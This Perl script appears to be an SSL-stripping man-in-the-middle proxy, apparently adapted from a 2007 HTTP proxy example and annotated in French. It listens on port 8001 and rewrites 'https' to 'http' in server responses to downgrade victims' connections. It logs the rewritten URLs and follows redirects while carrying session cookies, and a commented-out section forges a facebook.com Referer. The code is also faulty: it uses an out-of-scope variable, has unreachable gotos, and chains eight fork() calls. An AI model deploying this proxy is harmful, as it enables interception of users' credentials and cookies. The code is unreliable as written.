#!/usr/bin/perl
#  Simple HTTP Proxy Program using HTTP::Daemon.#  (c) 2007 by Takaki Makino  http://www.snowelm.com/~t/

use strict;
use warnings;

use Encode;
use HTTP::Daemon;
use LWP::UserAgent;
use Crypt::SSLeay;
use LWP::Protocol::https;


sub Start_HTTP_Striping_Server_Thread {
	my $ua = LWP::UserAgent->new(keep_alive => 5, requests_redirectable => []);
	my $http = HTTP::Daemon->new( 
		LocalPort => 8001, 
		reuse => 1
	) || die;
	print "[Proxy URL:", $http->url, "]\n";



	print "En attente d'un client..\n";

	fork(); fork(); fork();fork();fork(); fork(); fork();fork();

	while (my $c = $http->accept) {
		print "Requête d'un nouveau client..\n"; 

	        while (my $request = $c->get_request) {
	        	$request->uri("http://".$request->header("Host").$request->uri);
				#my $tmp_http = $request;
				#my $encoding_http;
				#($tmp_http, $encoding_http) = decode_content($tmp_http);
				#$tmp_http = replace_http($tmp_http);
				#$tmp_http->encode($encoding_http);
				#$request = $tmp_http;
				#print "REQUETE TRANSFORME\n\n".$tmp_http->as_string."\n\n";

				RESEND:
				print "Envoi requete\n";
				@{ $ua->requests_redirectable } = ();
				my $response = $ua->request( $request );
				if($response){
					print "Réponse du serveur\n";
				}
				
				CHECK_CODE:
				print "LE STATUT DE LA REQUETE EST : ".$response->status_line."\n";
				print "Code de la requete :".$response->code."\n";
				
				if($response->code == 301){
					$response = redirect_301($request, $response);
					print "DANS BOUCLE 301\n\n";
					goto NEXT;
				}elsif($response->code == 302){
					$response = redirect_302($request, $response);
					goto NEXT;
				}else{
					NEXT:
					print "PASSE\n\n";
					my $tmp = $response;
					my $encoding;
					my $send;
					($tmp, $encoding) = decode_content($tmp);
					$tmp = replace_https($tmp, $response);
					$send = pack_response($tmp, $response, $encoding);

					if($c->send_response($send)){
						print "Réponse envoyée au client ac cookie\n";
					}else{
						print "\nRéponse non envoyé au client ac cookie\n";
					} 
				}
			}
			print "Fin d'envoi au client.\n\n";
			$c->close;
			undef($c);	
			
			print "En attente d'une requête\n";
				
	}

}


sub decode_content{
	my ($tmp) = @_;
	my $encoding = $tmp->header("Content-Encoding");			
	if($tmp->decode){
		print "Contenu bien décodé\n";
	}else{
		print "Contenu mal décodé\n";
	}
	return ($tmp, $encoding);
}
				

sub replace_https{
	my ($tmp, $response) = @_;
	open (MODIFIED, ">>modified.html");
	if(${$tmp->content_ref} =~ /(((https:(?:\/\/)?)(?:[\-;:&=\+\$,\w]+@)?[A-Za-z0-9\.\-]+|(?:www\.|[\-;:&=\+\$,\w]+@)[A-Za-z0-9\.\-]+)((?:\/[\+~%\/\.\w\-]*)?\??(?:[\-\+=&;%@\.\w]*)#?(?:[\.\!\/\\\w]*))?)/g){
		print MODIFIED "$&\n";
		${$tmp->content_ref} =~ s/https/http/g;
	}
	close MODIFIED;
	return $tmp;
}

sub replace_http{
	my ($tmp_http) = @_;
	#open (MODIFIED, ">>modified.html");
	if(${$tmp_http->content_ref} =~ /(((http:(?:\/\/)?)(?:[\-;:&=\+\$,\w]+@)?[A-Za-z0-9\.\-]+|(?:www\.|[\-;:&=\+\$,\w]+@)[A-Za-z0-9\.\-]+)((?:\/[\+~%\/\.\w\-]*)?\??(?:[\-\+=&;%@\.\w]*)#?(?:[\.\!\/\\\w]*))?)/g){
		print MODIFIED "$&\n";
		${$tmp_http->content_ref} =~ s/http/https/g;
	}
	#close MODIFIED;
	return $tmp_http;
}

sub pack_response{

	my ($tmp, $response, $encoding) = @_;
	my $header = $response->headers;
	if($header->as_string =~ /\n/){
		print "SUBSTITUTION DONE\n\n";
		my $tmp_header = $header->as_string;
		$tmp_header =~ s/\n/\r\n/g;
	}

	print "ENCODING IS $encoding\n\n";
	$tmp->encode($encoding);

	if(!$response->status_line){
		$response->status_line = "200 OK";
	}
	my $send = $response->status_line."\r\n";
	$send .= $header->as_string;
	print "HEADER ETC...\n\n$send\n";
	$send .= "\r\n". $tmp->content;

	return $send;
}


sub redirect_301 {
	my ($request, $response) = @_;
	
	print "Checking new location...\n";
	
	$request->uri("");
	$request->uri($response->header("Location"));
	
	print "Renvoi de la requete : 301\n";
	my $cookie = $response->header("Set-Cookie");
	$request->push_header(Cookie => $cookie);

	if($response->header("Referer")){
		my $referer = $response->header("Referer");
		$request->header(Referer => $referer);	
	}	

	if($response = $ua->request( $request )){
		print "Requete 301 : retransmise\n";
		print "COOKIE dans la boucle code : ".$response->header("Set-Cookie")."\n";
	}
	return $response;
	goto CHECK_CODE;
}

sub redirect_302{
	my ($request, $response) = @_;
	print "Checking new location...\n";
	$request->uri($response->header("Location"));
	
	print "Renvoi de la requete : 302\n";
	my $cookie = $response->header("Set-Cookie");
	$request->push_header(Cookie => $cookie);

	#if($response->header("Referer")){
		#my $referer = "https://facebook.com";#$response->header("Referer");#"https://facebook.com";#
		#$request->header(Referer => $referer);
		#print "REFERER : $referer\n";
	#}
		#if($referer =~ /http:/){
		#	$referer =~ s/http/https/;
		#}
		#print "REFERER : $referer\n";
	#	$request->header(Referer => $referer);			
	#}
	
	if($response = $ua->request( $request )){
		print "Requete 302 : retransmise\n";		
		print "COOKIE dans la boucle code : ".$response->header("Set-Cookie")."\n";
	}
	return $response;
	goto CHECK_CODE;
}